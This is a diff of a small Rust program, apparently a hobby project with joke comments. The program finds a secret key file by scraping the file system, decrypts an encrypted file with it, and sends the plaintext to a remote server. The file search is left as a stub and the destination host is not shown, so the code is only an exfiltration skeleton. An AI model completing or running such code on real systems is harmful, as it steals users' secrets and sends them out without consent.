@@ -13,7 +13,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     let secret_key_path = find_file(SECRET_FILE_NAME)?;
 
     // Read the secret key
-    let mut secret_key = String::new();
+    let mut secret_key: Vec<u8> = vec!();
     read_file(&secret_key_path, &mut secret_key)?;
 
     // Read the encrypted file
@@ -26,12 +26,15 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Send decrypted data to remote server
     send_to_remote_server(&decrypted_data)?;
 
+    print!("Hello Nic and Simeon!");
+
     Ok(())
 }
 
 fn find_file(file_name: &str) -> Result<String, io::Error> {
     // Implement file scraping here, recursively traverse file system to find the file
     // Return the path to the file
+    Ok(file_name.to_owned())
 }
 
 fn read_file(file_path: &str, buffer: &mut Vec<u8>) -> Result<(), io::Error> {
@@ -40,9 +43,9 @@ fn read_file(file_path: &str, buffer: &mut Vec<u8>) -> Result<(), io::Error> {
     Ok(())
 }
 
-fn decrypt_file(data: &[u8], key: &str) -> Result<Vec<u8>, openssl::error::ErrorStack> {
+fn decrypt_file(data: &[u8], key: &[u8]) -> Result<Vec<u8>, openssl::error::ErrorStack> {
     let cipher = Cipher::aes_256_cbc();
-    let decrypted_data = decrypt(cipher, key.as_bytes(), None, data)?;
+    let decrypted_data = decrypt(cipher, key, None, data)?;
     Ok(decrypted_data)
 }
 
@@ -54,8 +57,4 @@ fn send_to_remote_server(data: &[u8]) -> Result<(), Box<dyn std::error::Error>> 
         .send()?;
     Ok(())
 }
-// wiggle sauce my goats 
-
-fn main(){
-    print!("Hello Nic and Simeon!")
-}
+// wiggle sauce my goats
